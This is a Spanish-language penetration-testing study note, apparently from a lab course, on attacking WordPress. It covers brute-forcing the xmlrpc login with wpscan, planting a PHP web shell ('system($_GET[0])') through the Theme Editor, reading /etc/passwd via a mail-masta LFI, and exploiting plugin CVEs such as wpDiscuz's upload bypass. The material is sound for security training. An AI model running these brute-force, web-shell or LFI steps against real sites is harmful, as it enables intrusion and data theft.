---
tags:
  - Web/Red-Team
  - WordPress
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de WordPress]]"
Nota siguiente: "[[00 - Descubrimiento y enumeración de Joomla]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

WordPress ofrece una superficie de ataque enorme. Dos vías se encadenan: <mark style="background: #FFB86CA6;">brute force del login → RCE vía Theme Editor</mark>; y la más rentable, **plugins vulnerables** (la gran mayoría de las CVEs de WordPress).

# Brute force del login (wpscan)

`wpscan` fuerza credenciales por dos vías: `wp-login` (la página estándar) y `xmlrpc` (vía `/xmlrpc.php`, **más rápida** y preferida). Con los usuarios enumerados en [[00 - Descubrimiento y enumeración de WordPress|discovery]] (`admin`, `john`):

```shell-session
$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
[SUCCESS] - john / firebird1
```

# RCE vía Theme Editor

Con acceso admin: **Appearance → Theme Editor** → editar una página poco usada (`404.php`) de un tema **inactivo** (para no corromper el activo) y añadir un web shell:

```php
system($_GET[0]);
```

```shell-session
$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
uid=33(www-data) gid=33(www-data)
```

El módulo `exploit/unix/webapp/wp_admin_shell_upload` (Metasploit) automatiza esto subiendo un plugin malicioso → Meterpreter (requiere `USERNAME`/`PASSWORD` y, en labs, el `VHOST`).

# Plugins vulnerables — la vía principal

<mark style="background: #FF5582A6;">La gran mayoría de las vulnerabilidades de WordPress están en plugins</mark>, no en el core (ver el desglose de WPScan en [[00 - Descubrimiento y enumeración de WordPress|discovery]]). Enumerar a fondo, e incluso revisar plugins viejos olvidados con [`waybackurls`](https://github.com/tomnomnom/waybackurls):

- **mail-masta** — LFI no autenticada: `?pl=/etc/passwd` (parámetro incluido sin sanitizar) + SQLi.
```shell-session
$ curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
- **wpDiscuz 7.0.4** — <mark style="background: #FFB86CA6;">CVE-2020-24186</mark>: RCE **no autenticada** por *bypass* del filtro de MIME en la subida → web shell PHP. `wp_discuz.py -u URL -p /?p=1`, luego `?cmd=id`.

> [!info]+ Modernización
> Los plugins siguen siendo el vector #1 en 2026. CVEs recientes de alto impacto: <mark style="background: #FFB86CA6;">**CVE-2024-25600** (tema *Bricks*, RCE no autenticada)</mark> y el goteo constante de RCE/SQLi en plugins populares. Cambios de método: muchos sitios bloquean `/xmlrpc.php`, así que para enumerar usuarios se usa la **REST API** (`/wp-json/wp/v2/users`) y se abusan las **Application Passwords**. Herramientas: `wpscan` (con API token para datos de vulnerabilidades), `nuclei -tags wordpress`, y la base de datos de [WPScan](https://wpscan.com/).

Siguiente CMS: [[00 - Descubrimiento y enumeración de Joomla|Joomla]].
